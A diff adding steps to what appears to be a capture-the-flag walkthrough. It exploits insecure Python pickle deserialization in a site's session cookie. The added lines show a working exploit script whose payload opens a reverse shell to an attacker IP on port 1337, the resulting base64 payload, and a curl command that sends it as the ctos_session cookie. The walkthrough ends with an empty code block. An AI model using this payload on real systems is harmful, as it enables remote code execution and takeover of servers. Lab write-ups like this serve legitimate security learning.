@@ -401,6 +401,33 @@ penelope -p 1337
 So first ill start a listener
 
 ```python
+cat RCE.py          
+import pickle, base64, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.200.88.158\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+```
+
+Ill craft my payload
+
+```python
+python3 RCE.py 
+gAWV5wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjMxweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjIwMC44OC4xNTgiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSeUhZRSlC4=
+```
+
+Ill then run the script and get the malicious session
+
+```python
+curl http://ctos.site/ -H 'Cookie: ctos_session=gAWV5wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjMxweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjIwMC44OC4xNTgiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSeUhZRSlC4='
+```
+
+Now ill send the request using the malicious session
+
+```python
 
 ```
 
